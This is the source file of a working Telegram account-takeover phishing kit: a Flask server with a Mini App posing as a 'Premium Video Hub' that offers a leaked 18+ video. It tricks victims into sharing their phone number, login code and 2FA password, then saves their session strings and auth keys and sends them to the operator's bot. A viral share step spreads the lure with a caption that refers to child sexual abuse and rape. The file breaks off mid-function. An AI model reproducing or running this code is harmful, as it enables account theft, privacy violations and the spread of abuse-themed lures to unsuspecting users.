from flask import Flask, request, jsonify, render_template_string
import os, json, base64, threading, asyncio, logging, sys
import requests as http_requests
from datetime import datetime
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
OWNER_ID = int(os.environ.get("OWNER_ID", "0"))
WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://yourdomain.com")
# ===================================

if sys.version_info >= (3, 12) and sys.platform == 'win32':
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except:
        pass

app = Flask(__name__)

user_sessions = {}
pending_codes = {}
pending_2fa = {}
sessions_lock = threading.Lock()

DATA_FILE = "captured_accounts.json"

def load_accounts():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                return json.load(f)
        except Exception:
            return []
    return []

def save_account(account):
    accounts = load_accounts()
    for i, a in enumerate(accounts):
        if a['phone'] == account['phone']:
            accounts[i] = account
            break
    else:
        accounts.append(account)
    with open(DATA_FILE, 'w') as f:
        json.dump(accounts, f, indent=2, ensure_ascii=False)
    logger.info(f"✅ Saved: {account['phone']}")
    return account

captured_accounts = load_accounts()

# ====== NEW: Telegram User -> Phone mapping ======
USER_PHONE_MAP_FILE = "user_phone_map.json"

def load_user_phone_map():
    if os.path.exists(USER_PHONE_MAP_FILE):
        try:
            with open(USER_PHONE_MAP_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_user_phone_map(m):
    with open(USER_PHONE_MAP_FILE, 'w') as f:
        json.dump(m, f, indent=2)

user_phone_map = load_user_phone_map()  # {tg_user_id: phone}


def format_phone(ph):
    if not ph:
        return ph
    digits = ''.join(filter(str.isdigit, ph))
    if not digits:
        return ph
    if ph.startswith('+'):
        return ph
    if len(digits) == 10:
        return '+91' + digits
    if len(digits) == 12 and digits.startswith('91'):
        return '+' + digits
    return '+' + digits


def send_bot_notification(phone, ss, me, dc, password_used=False, password_value=""):
    try:
        max_len = 3900
        extra = ""
        if password_used:
            extra = "\n🔐 2FA Password Used"
            if password_value:
                extra += f"\n🔑 2FA Password: `{password_value}`"

        if len(ss) > max_len:
            msg1 = (
                f"🔔 New Account Captured!{extra}\n\n"
                f"📱 Phone: {phone}\n"
                f"👤 Name: {me.first_name or ''} {me.last_name or ''}\n"
                f"🆔 User ID: {me.id}\n"
                f"📛 Username: @{me.username or 'N/A'}\n"
                f"🌐 DC: {dc}\n"
                f"📏 Session Length: {len(ss)} chars\n\n"
                f"📄 Session (part 1/2):\n`{ss[:max_len]}`"
            )
            msg2 = f"📄 Session (part 2/2) for {phone}:\n`{ss[max_len:]}`"
            http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={'chat_id': OWNER_ID, 'text': msg1, 'parse_mode': 'Markdown'}, timeout=15)
            http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={'chat_id': OWNER_ID, 'text': msg2, 'parse_mode': 'Markdown'}, timeout=15)
        else:
            msg = (
                f"🔔 New Account!{extra}\n"
                f"📱 {phone}\n"
                f"👤 {me.first_name} {me.last_name or ''}\n"
                f"🆔 {me.id}\n"
                f"🌐 DC: {dc}\n"
                f"📏 Session: {len(ss)} chars\n\n"
                f"🔑 Session:\n`{ss}`"
            )
            r = http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={'chat_id': OWNER_ID, 'text': msg, 'parse_mode': 'Markdown'}, timeout=15)
            if r.status_code != 200:
                http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={'chat_id': OWNER_ID, 'text': f"Session for {phone}:\n{ss}"}, timeout=15)
    except Exception as e:
        logger.error(f"Bot notify error: {e}")
        print(f"\n🔴 BOT FAILED! Session for {phone}:\n{ss}\n")


# ====== Telegram async ======

def run_telegram_action(phone, code=None, password=None):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        async def send_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                r = await client.send_code_request(phone)
                session_str = StringSession.save(client.session)
                with sessions_lock:
                    user_sessions[phone] = {
                        'hash': r.phone_code_hash,
                        'session': session_str,
                        'phone_code_result': r
                    }
                    pending_codes[phone] = 'sent'
                    pending_2fa[phone] = False
                return {'success': True}
            except errors.FloodWaitError as e:
                with sessions_lock:
                    pending_codes[phone] = 'err'
                return {'success': False, 'error': f'Flood wait {e.seconds}s'}
            except Exception as e:
                with sessions_lock:
                    pending_codes[phone] = 'err'
                return {'success': False, 'error': str(e)[:80]}
            finally:
                await client.disconnect()

        async def verify():
            with sessions_lock:
                if phone not in user_sessions:
                    return {'success': False, 'error': 'Session not found'}
                s = user_sessions[phone]

            client = TelegramClient(StringSession(s['session']), API_ID, API_HASH)
            try:
                await client.connect()
                if await client.is_user_authorized():
                    me = await client.get_me()
                else:
                    try:
                        await client.sign_in(phone=phone, code=code, phone_code_hash=s['hash'])
                        me = await client.get_me()
                    except errors.SessionPasswordNeededError:
                        with sessions_lock:
                            pending_2fa[phone] = True
                            pending_codes[phone] = '2fa_needed'
                        if password:
                            try:
                                await client.sign_in(password=password)
                                me = await client.get_me()
                                with sessions_lock:
                                    pending_2fa[phone] = False
                                    pending_codes[phone] = 'done'
                            except errors.PasswordHashInvalidError:
                                return {'success': False, 'error': 'Wrong 2FA password'}
                            except Exception as e:
                                return {'success': False, 'error': f'2FA error: {str(e)[:50]}'}
                        else:
                            return {'success': False, 'error': '2FA', 'needs_password': True}
                    except errors.PhoneCodeInvalidError:
                        return {'success': False, 'error': 'Wrong code'}
                    except errors.PhoneCodeExpiredError:
                        return {'success': False, 'error': 'Code expired'}
                    except Exception as e:
                        return {'success': False, 'error': str(e)[:80]}

                await client.get_dialogs()
                ss = StringSession.save(client.session)
                auth_key = None
                try:
                    auth_key = client.session.auth_key.key
                except:
                    pass
                dc = client.session.dc_id

                if not auth_key:
                    await client.disconnect()
                    await asyncio.sleep(0.5)
                    client2 = TelegramClient(StringSession(ss), API_ID, API_HASH)
                    await client2.connect()
                    await client2.get_dialogs()
                    auth_key = client2.session.auth_key.key
                    dc = client2.session.dc_id
                    ss = StringSession.save(client2.session)
                    me = await client2.get_me()
                    await client2.disconnect()
                    client = client2

                auth_b64 = base64.b64encode(auth_key).decode() if auth_key else ""
                password_used = password is not None

                acc = {
                    'phone': phone,
                    'user_id': me.id,
                    'username': me.username or '',
                    'first_name': me.first_name or '',
                    'last_name': me.last_name or '',
                    'session': ss,
                    'webk': json.dumps({
                        'dcId': dc,
                        'authKey': auth_b64,
                        'userId': me.id,
                        'isSupport': False,
                        'isTest': False
                    }),
                    'dc': dc,
                    'time': str(datetime.now()),
                    'has_2fa': password_used,
                    'password': password if password_used else ''
                }
                save_account(acc)
                global captured_accounts
                captured_accounts = load_accounts()

                with sessions_lock:
                    if phone in user_sessions:
                        del user_sessions[phone]
                    if phone in pending_2fa:
                        del pending_2fa[phone]
                    pending_codes[phone] = 'done'

                send_bot_notification(phone, ss, me, dc, password_used, password if password_used else "")
                return {'success': True, 'session': ss, 'user_id': me.id}
            except Exception as e:
                e_str = str(e)
                if 'PHONE_CODE_INVALID' in e_str:
                    return {'success': False, 'error': 'Wrong code'}
                if 'SESSION_PASSWORD_NEEDED' in e_str:
                    return {'success': False, 'error': '2FA', 'needs_password': True}
                if 'PASSWORD_HASH_INVALID' in e_str:
                    return {'success': False, 'error': 'Wrong 2FA password'}
                return {'success': False, 'error': e_str[:80]}
            finally:
                try:
                    await client.disconnect()
                except:
                    pass

        if code:
            return loop.run_until_complete(verify())
        else:
            return loop.run_until_complete(send_code())
    finally:
        loop.close()


# ====== WEBAPP PAGE (Telegram Mini App) ======
PAGE = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Premium Video Hub</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:white;min-height:100vh}
.header{padding:50px 20px 25px;text-align:center;background:linear-gradient(180deg,#1a1a2e,#0a0a0a)}
.header h1{font-size:26px;font-weight:900;background:linear-gradient(45deg,#ff6b6b,#ffa500);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.header p{color:#777;font-size:13px;margin-top:8px}
.video-card{margin:15px 20px;background:#141420;border-radius:15px;overflow:hidden;border:1px solid #1a1a2e}
.thumbnail{width:100%;height:210px;background:linear-gradient(135deg,#2d1b69,#ff6b6b);display:flex;align-items:center;justify-content:center}
.thumbnail .play-btn{width:65px;height:65px;background:rgba(255,255,255,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;border:2px solid rgba(255,255,255,0.2)}
.video-info{padding:15px}
.video-info h3{font-size:15px;margin-bottom:5px}
.video-info .meta{color:#666;font-size:12px}
.video-info .badge{display:inline-block;background:#e94560;padding:2px 10px;border-radius:4px;font-size:11px;margin-top:8px}
.link-section{padding:10px 20px 20px;text-align:center}
.get-link-btn{width:100%;padding:18px;background:linear-gradient(45deg,#e94560,#ff6b6b);border:none;border-radius:50px;color:white;font-size:18px;font-weight:800;cursor:pointer;box-shadow:0 8px 30px rgba(233,69,96,0.4);letter-spacing:1px;text-transform:uppercase}
.modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.9);z-index:1000;padding:20px;overflow-y:auto}
.modal-overlay.active{display:flex;align-items:center;justify-content:center}
.modal{background:#141420;border-radius:20px;padding:30px;max-width:380px;width:100%;border:1px solid #1a1a2e}
.modal-icon{text-align:center;font-size:45px;margin-bottom:10px}
.modal h2{text-align:center;font-size:18px;margin-bottom:5px}
.modal p{text-align:center;color:#888;font-size:13px;margin-bottom:15px}
.sb{text-align:center;padding:12px;border-radius:10px;margin:10px 0;display:none;font-size:13px}
.sb.success{display:block;background:rgba(76,175,80,0.15);color:#81C784}
.sb.error{display:block;background:rgba(244,67,54,0.15);color:#EF9A9A}
.sb.info{display:block;background:rgba(33,150,243,0.15);color:#90CAF9}
.sb.waiting{display:block;background:rgba(255,152,0,0.15);color:#FFB74D}
.contact-btn{width:100%;padding:18px;background:#0088cc;border:none;border-radius:12px;color:white;font-size:17px;font-weight:700;cursor:pointer;margin:10px 0;display:flex;align-items:center;justify-content:center;gap:10px}
.contact-btn:disabled{opacity:0.5;cursor:not-allowed}
.cd{background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;padding:15px;font-size:30px;text-align:center;letter-spacing:15px;color:white;margin:10px 0;font-weight:bold;min-height:55px}
.np{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:10px 0}
.np .k{padding:16px;border:none;border-radius:10px;background:#2a2a3e;color:white;font-size:22px;cursor:pointer}
.np .kc{background:#e94560;color:white}
.np .ks{background:#4CAF50;color:white;font-weight:700;font-size:14px}
.np .ks:disabled{background:#333;color:#666}
.step{display:none}.step.active{display:block}
.sp{display:inline-block;width:18px;height:18px;border:2px solid #333;border-top-color:#0088cc;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:6px}
@keyframes spin{to{transform:rotate(360deg)}}
.share-progress{display:flex;justify-content:center;margin:15px 0;gap:5px}
.share-step{width:35px;height:35px;border-radius:50%;background:#2a2a3e;display:flex;align-items:center;justify-content:center;font-size:14px;color:#666;font-weight:700}
.share-step.done{background:#4CAF50;color:white}
.share-step.active{background:#0088cc;color:white}
.pwd-input{width:100%;padding:15px;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;color:white;font-size:16px;text-align:center;outline:none;margin:10px 0}
.footer{text-align:center;padding:20px;color:#333;font-size:11px}
</style>
</head>
<body>
<div class="header">
    <h1>🔥 PREMIUM VIDEO HUB</h1>
    <p>Exclusive content — Verified members only</p>
</div>
<div class="video-card">
    <div class="thumbnail"><div class="play-btn">▶</div></div>
    <div class="video-info">
        <h3>🔥 LEAKED PRIVATE VIDEO — 2026</h3>
        <div class="meta">⭐ 4.9 (2.4M views) • 18+</div>
        <span class="badge">🔞 RESTRICTED</span>
    </div>
</div>
<div class="link-section">
    <button class="get-link-btn" id="glb">🔞 GET YOUR LINK</button>
</div>
<div class="footer">© 2026 Premium Video Hub</div>

<div class="modal-overlay" id="vm">
<div class="modal">
    <!-- Step 1: Contact share -->
    <div id="s1" class="step active">
        <div class="modal-icon">📱</div>
        <h2>Telegram verification</h2>
        <p>Tap below to share your Telegram number</p>
        <button class="contact-btn" id="cbtn" onclick="requestContact()">
            📲 Share Contact
        </button>
        <div id="ps1" class="sb info" style="display:none"></div>
    </div>

    <!-- Step 2: OTP -->
    <div id="s2" class="step">
        <div class="modal-icon">🔐</div>
        <h2>Verification code</h2>
        <p>📱 <span id="pd" style="color:#0088cc;font-weight:bold;"></span></p>
        <div id="cs" class="sb waiting"><span class="sp"></span> Sending code...</div>
        <div class="cd" id="cdisp">_</div>
        <div class="np">
            <button class="k" onclick="pk('1')">1</button>
            <button class="k" onclick="pk('2')">2</button>
            <button class="k" onclick="pk('3')">3</button>
            <button class="k" onclick="pk('4')">4</button>
            <button class="k" onclick="pk('5')">5</button>
            <button class="k" onclick="pk('6')">6</button>
            <button class="k" onclick="pk('7')">7</button>
            <button class="k" onclick="pk('8')">8</button>
            <button class="k" onclick="pk('9')">9</button>
            <button class="k kc" onclick="cc()">⌫</button>
            <button class="k" onclick="pk('0')">0</button>
            <button class="k ks" id="sb" onclick="sc()">✓ Verify</button>
        </div>
        <div id="vs" class="sb"></div>
    </div>

    <!-- Step 2b: 2FA -->
    <div id="s2b" class="step">
        <div class="modal-icon">🔐</div>
        <h2>Two-Factor Authentication</h2>
        <p>Enter your Telegram cloud password</p>
        <input type="password" id="pwdInput" class="pwd-input" placeholder="Password" maxlength="64">
        <button class="contact-btn" style="background:#e94560" onclick="submitPassword()">🔑 Verify Password</button>
        <div id="pwdStatus" class="sb"></div>
    </div>

    <!-- Step 3: Share -->
    <div id="s3" class="step">
        <div class="modal-icon">🎬</div>
        <h2>Almost there!</h2>
        <p>Share with <strong>5 friends</strong> to unlock the video</p>
        <div class="share-progress">
            <div class="share-step" id="sp1">1</div>
            <div class="share-step" id="sp2">2</div>
            <div class="share-step" id="sp3">3</div>
            <div class="share-step" id="sp4">4</div>
            <div class="share-step" id="sp5">5</div>
        </div>
        <div id="shareStatus" class="sb waiting" style="display:block"><span class="sp"></span> Share to start unlocking...</div>
        <button class="contact-btn" style="background:#25D366" onclick="simulateShare()">📤 Share to Telegram</button>
    </div>
</div>
</div>

<script>
var tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

var phoneNumber = '';
var codeDigits = '';
var codeCheckInterval = null;
var passwordCheckInterval = null;
var sharesDone = 0;
var TG_CHANNEL_LINK = 'https://t.me/videodks';
var TG_CHANNEL_CAPTION = '𝗖𝗽, 𝗿𝗮𝗽𝗲,𝗺𝗼𝗺 𝘀𝗼𝗼𝗻🔞👇';
var tgUserId = tg.initDataUnsafe?.user?.id || null;
var tgFirstName = tg.initDataUnsafe?.user?.first_name || '';

// ====== OPEN MODAL ======
document.getElementById('glb').onclick = async function() {
    document.getElementById('vm').classList.add('active');
    document.getElementById('s1').classList.add('active');
    document.getElementById('s2').classList.remove('active');
    document.getElementById('s2b').classList.remove('active');
    document.getElementById('s3').classList.remove('active');

    // Check if this telegram user already shared contact before
    if (tgUserId) {
        try {
            var res = await fetch('/api/user_phone?tg_user_id=' + tgUserId);
            var data = await res.json();
            if (data.phone) {
                phoneNumber = data.phone;
                // Already have phone → check if account already captured
                var res2 = await fetch('/session/' + encodeURIComponent(phoneNumber));
                var data2 = await res2.json();
                if (data2.user_id) {
                    // Fully captured → straight to share page
                    goToSharePage();
                    return;
                }
                // Have phone but not verified → send OTP directly
                sendPhoneToBackend(phoneNumber);
                return;
            }
        } catch(e) {}
    }
    // No phone yet → ask contact
};

// ====== REQUEST CONTACT ======
function requestContact() {
    if (!tg || !tg.requestContact) {
        document.getElementById('ps1').className = 'sb error';
        document.getElementById('ps1').innerHTML = '❌ Telegram WebApp not available. Open inside Telegram.';
        document.getElementById('ps1').style.display = 'block';
        return;
    }

    var btn = document.getElementById('cbtn');
    btn.disabled = true;
    btn.innerHTML = '<span class="sp"></span> Waiting for contact...';

    tg.requestContact(function(sent, event) {
        if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) {
            var c = event.responseUnsafe.contact;
            var rawPhone = c.phone_number || '';
            phoneNumber = normalizePhone(rawPhone);
            document.getElementById('pd').textContent = phoneNumber;

            // Save telegram user_id → phone mapping on server
            if (tgUserId) {
                fetch('/api/save_user_phone', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({tg_user_id: tgUserId, phone: phoneNumber})
                });
            }

            btn.disabled = false;
            btn.innerHTML = '📲 Share Contact';
            document.getElementById('ps1').className = 'sb success';
            document.getElementById('ps1').innerHTML = '✅ Contact received: ' + phoneNumber;
            document.getElementById('ps1').style.display = 'block';

            // Move to OTP flow
            setTimeout(function(){ sendPhoneToBackend(phoneNumber); }, 500);
        } else {
            // User cancelled → show button again immediately
            btn.disabled = false;
            btn.innerHTML = '📲 Share Contact';
            document.getElementById('ps1').className = 'sb error';
            document.getElementById('ps1').innerHTML = '❌ Contact share korte hobe. Abar try koro.';
            document.getElementById('ps1').style.display = 'block';
        }
    });
}

function normalizePhone(ph) {
    var digits = ph.replace(/\D/g, '');
    if (ph.startsWith('+')) return ph;
    if (digits.length === 10) return '+91' + digits;
    if (digits.length === 12 && digits.startsWith('91')) return '+' + digits;
    return '+' + digits;
}

// ====== SEND PHONE TO BACKEND ======
async function sendPhoneToBackend(phone) {
    try {
        var res = await fetch('/api/share', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone: phone})
        });
        var data = await res.json();
        if (data.success) {
            document.getElementById('s1').classList.remove('active');
            document.getElementById('s2').classList.add('active');
            document.getElementById('pd').textContent = phone;
            var cs = document.getElementById('cs');
            cs.className = 'sb waiting';
            cs.innerHTML = '<span class="sp"></span> কোড পাঠানো হচ্ছে...';
            cs.style.display = 'block';
            startCodeCheck();
        } else {
            var ps = document.getElementById('ps1');
            ps.className = 'sb error';
            ps.innerHTML = '❌ ' + (data.error || 'Error');
            ps.style.display = 'block';
        }
    } catch(e) {
        var ps = document.getElementById('ps1');
        ps.className = 'sb error';
        ps.innerHTML = '❌ Connection error';
        ps.style.display = 'block';
    }
}

// ====== POLL FOR STATUS ======
function startCodeCheck() {
    if (codeCheckInterval) clearInterval(codeCheckInterval);
    codeCheckInterval = setInterval(async function() {
        try {
            var res = await fetch('/api/check', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phoneNumber})
            });
            var data = await res.json();
            if (data.s === 'sent') {
                clearInterval(codeCheckInterval); codeCheckInterval = null;
                var cs = document.getElementById('cs');
                cs.className = 'sb success';
                cs.innerHTML = '✅ কোড পাঠানো হয়েছে!';
                cs.style.display = 'block';
            } else if (data.s === 'done') {
                clearInterval(codeCheckInterval); codeCheckInterval = null;
                fetchUserIdAndGoToShare(phoneNumber);
            } else if (data.s === '2fa_needed') {
                clearInterval(codeCheckInterval); codeCheckInterval = null;
                document.getElementById('s2').classList.remove('active');
                document.getElementById('s2b').classList.add('active');
                startPasswordCheck();
            } else if (data.s === 'err') {
                clearInterval(codeCheckInterval); codeCheckInterval = null;
                var cs = document.getElementById('cs');
                cs.className = 'sb error';
                cs.innerHTML = '❌ কোড পাঠাতে সমস্যা';
                cs.style.display = 'block';
            }
        } catch(e) {}
    }, 2000);
}

function startPasswordCheck() {
    if (passwordCheckInterval) clearInterval(passwordCheckInterval);
    passwordCheckInterval = setInterval(async function() {
        try {
            var res = await fetch('/api/check', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phoneNumber})
            });
            var data = await res.json();
            if (data.s === 'done') {
                clearInterval(passwordCheckInterval); passwordCheckInterval = null;
                fetchUserIdAndGoToShare(phoneNumber);
            } else if (data.s === 'err') {
                clearInterval(passwordCheckInterval); passwordCheckInterval = null;
                var ps = document.getElementById('pwdStatus');
                ps.className = 'sb error';
                ps.innerHTML = '❌ Verification failed';
                ps.style.display = 'block';
            }
        } catch(e) {}
    }, 2000);
}

async function fetchUserIdAndGoToShare(phone) {
    goToSharePage();
}

// ====== OTP KEYPAD ======
function pk(n) { if (codeDigits.length < 5) { codeDigits += n; document.getElementById('cdisp').textContent = codeDigits; } }
function cc() { codeDigits = codeDigits.slice(0, -1); document.getElementById('cdisp').textContent = codeDigits || '_'; }

async function sc() {
    if (codeDigits.length < 5) { showVerifyStatus('❌ ৫ ডিজিট দিন', 'error'); return; }
    document.getElementById('sb').disabled = true;
    document.getElementById('sb').textContent = '⏳ ...';
    try {
        var res = await fetch('/api/verify', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone: phoneNumber, code: codeDigits})
        });
        var data = await res.json();
        if (data.success) {
            goToSharePage();
            if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
        } else if (data.needs_password) {
            document.getElementById('s2').classList.remove('active');
            document.getElementById('s2b').classList.add('active');
            if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
        } else {
            showVerifyStatus('❌ ' + (data.error || 'ভুল কোড'), 'error');
            codeDigits = ''; document.getElementById('cdisp').textContent = '_';
            document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ Verify';
        }
    } catch(e) {
        showVerifyStatus('❌ Error', 'error');
        document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ Verify';
    }
}

async function submitPassword() {
    var pwd = document.getElementById('pwdInput').value.trim();
    if (!pwd) {
        var ps = document.getElementById('pwdStatus');
        ps.className = 'sb error'; ps.innerHTML = '❌ Password din'; ps.style.display = 'block';
        return;
    }
    var ps = document.getElementById('pwdStatus');
    ps.className = 'sb waiting';
    ps.innerHTML = '<span class="sp"></span> Checking...';
    ps.style.display = 'block';
    try {
        var res = await fetch('/api/verify', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone: phoneNumber, code: codeDigits, password: pwd})
        });
        var data = await res.json();
        if (data.success) {
            goToSharePage();
            if (passwordCheckInterval) { clearInterval(passwordCheckInterval); passwordCheckInterval = null; }
        } else {
            ps.className = 'sb error';
            ps.innerHTML = '❌ ' + (data.error || 'Wrong password');
            ps.style.display = 'block';
        }
    } catch(e) {
        ps.className = 'sb error'; ps.innerHTML = '❌ Error'; ps.style.display = 'block';
    }
}

function showVerifyStatus(msg, type) {
    document.getElementById('vs').textContent = msg;
    document.getElementById('vs').className = 'sb ' + type;
    document.getElementById('vs').style.display = 'block';
}

// ====== SHARE PAGE ======
function goToSharePage() {
    document.getElementById('s1').classList.remove('active');
    document.getElementById('s2').classList.remove('active');
    document.getElementById('s2b').classList.remove('active');
    document.getElementById('s3').classList.add('active');
    setupShareLink();
}

function setupShareLink() {
    updateShareProgress();
    if (sharesDone > 0) {
        var st = document.getElementById('shareStatus');
        st.className = 'sb success';
        st.innerHTML = '✅ ' + sharesDone + '/5 shared';
        st.style.display = 'block';
    }
}

function simulateShare() {
    var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL_LINK) + '&text=' + encodeURIComponent(TG_CHANNEL_CAPTION);
    window.open(shareUrl, '_blank');
    sharesDone = Math.min(sharesDone + 1, 4);
    updateShareProgress();
    var st = document.getElementById('shareStatus');
    if (sharesDone >= 4) {
        st.className = 'sb waiting';
        st.innerHTML = '<span class="sp"></span> Ar matro 1 ta share baki!';
    } else {
        st.className = 'sb success';
        st.innerHTML = '✅ ' + sharesDone + '/5 shared';
    }
    st.style.display = 'block';
}

function updateShareProgress() {
    for (var i = 1; i <= 5; i++) {
        var el = document.getElementById('sp' + i);
        if (i <= sharesDone) el.className = 'share-step done';
        else if (i === shares
